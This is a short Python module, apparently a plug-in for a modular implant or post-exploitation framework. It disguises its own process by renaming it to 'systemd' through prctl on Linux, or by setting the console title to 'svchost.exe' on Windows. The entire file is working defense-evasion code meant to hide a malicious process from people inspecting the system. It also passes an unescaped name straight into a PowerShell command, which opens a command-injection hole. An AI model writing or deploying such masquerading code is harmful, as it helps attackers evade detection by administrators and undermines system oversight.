"""
@module: masquerade
@desc: 进程伪装（Linux: prctl comm 改名；Windows: 控制台标题）
"""
import os
import subprocess

MODULE = {
    "desc": "进程伪装（Linux prctl / Windows 标题）",
    "params": [("new_name", '默认 "systemd"（Linux）/ "svchost.exe"（Windows）')],
}


def run(new_name=""):
    if os.name == "nt":
        n = new_name or "svchost.exe"
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 f"$Host.UI.RawUI.WindowTitle='{n}'"],
                timeout=10, capture_output=True)
        except Exception:
            pass
        return f"(masquerade: 控制台标题 → {n})"
    n = new_name or "systemd"
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        # PR_SET_NAME = 15（/proc/self/comm 与 ps 显示名）
        libc.prctl(15, n.encode()[:15], 0, 0, 0)
        return f"(masquerade: comm → {n})"
    except Exception as e:
        return f"(masquerade failed: {e})"
